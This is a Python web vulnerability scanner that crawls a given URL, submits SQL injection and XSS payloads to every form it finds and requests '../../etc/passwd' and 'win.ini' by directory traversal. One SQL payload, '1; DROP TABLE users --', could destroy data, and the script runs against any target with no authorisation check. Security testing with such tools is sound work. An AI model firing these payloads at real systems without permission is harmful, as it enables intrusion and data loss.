import requests
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebKit/537.36'})
        self.vulnerabilities = []
        self.forms = []

    def crawl(self):
        """Crawl the target website to find forms and links."""
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code != 200:
                print(f"[-] Failed to access {self.target_url} (Status: {response.status_code})")
                return
            soup = BeautifulSoup(response.text, 'html.parser')
            self.forms = soup.find_all('form')
            print(f"[+] Found {len(self.forms)} forms on {self.target_url}")
        except requests.RequestException as e:
            print(f"[-] Error crawling {self.target_url}: {e}")

    def test_sql_injection(self, form_action, form_inputs):
        """Test for SQL Injection vulnerabilities in form inputs."""
        sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' OR 'a'='a"]
        for payload in sql_payloads:
            data = {inp['name']: payload for inp in form_inputs if 'name' in inp.attrs}
            try:
                response = self.session.post(form_action, data=data, timeout=10)
                if any(error in response.text.lower() for error in ['sql syntax', 'mysql', 'sqlite', 'postgresql']):
                    self.vulnerabilities.append(f"SQL Injection vulnerability found at {form_action} with payload: {payload}")
                    print(f"[!] SQL Injection detected: {form_action}")
            except requests.RequestException as e:
                print(f"[-] Error testing SQL Injection: {e}")

    def test_xss(self, form_action, form_inputs):
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        for payload in xss_payloads:
            data = {inp['name']: payload for inp in form_inputs if 'name' in inp.attrs}
            try:
                response = self.session.post(form_action, data=data, timeout=10)
                if payload in response.text:
                    self.vulnerabilities.append(f"XSS vulnerability found at {form_action} with payload: {payload}")
                    print(f"[!] XSS detected: {form_action}")
            except requests.RequestException as e:
                print(f"[-] Error testing XSS: {e}")

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities."""
        traversal_payloads = ["../../etc/passwd", "../../windows/win.ini"]
        for payload in traversal_payloads:
            test_url = urljoin(self.target_url, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if any(sign in response.text for sign in ['root:', '[extensions]']):
                    self.vulnerabilities.append(f"Directory Traversal vulnerability found at {test_url}")
                    print(f"[!] Directory Traversal detected: {test_url}")
            except requests.RequestException as e:
                print(f"[-] Error testing Directory Traversal: {e}")

    def scan_forms(self):
        """Scan all discovered forms for vulnerabilities."""
        for form in self.forms:
            action = form.get('action', '')
            if not action:
                action = self.target_url
            else:
                action = urljoin(self.target_url, action)
            inputs = form.find_all('input')
            if inputs:
                print(f"[+] Testing form: {action}")
                self.test_sql_injection(action, inputs)
                self.test_xss(action, inputs)

    def run(self):
        """Run the full vulnerability scan."""
        print(f"[*] Starting scan on {self.target_url}")
        self.crawl()
        self.scan_forms()
        self.test_directory_traversal()
        print("\n[*] Scan completed. Vulnerabilities found:")
        if self.vulnerabilities:
            for vuln in self.vulnerabilities:
                print(f" - {vuln}")
        else:
            print("[-] No vulnerabilities detected.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python web_vuln_scanner.py <target_url>")
        print("Example: python web_vuln_scanner.py http://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not re.match(r'^https?://', target_url):
        target_url = 'http://' + target_url
    
    scanner = WebVulnScanner(target_url)
    scanner.run()

if __name__ == "__main__":
    main()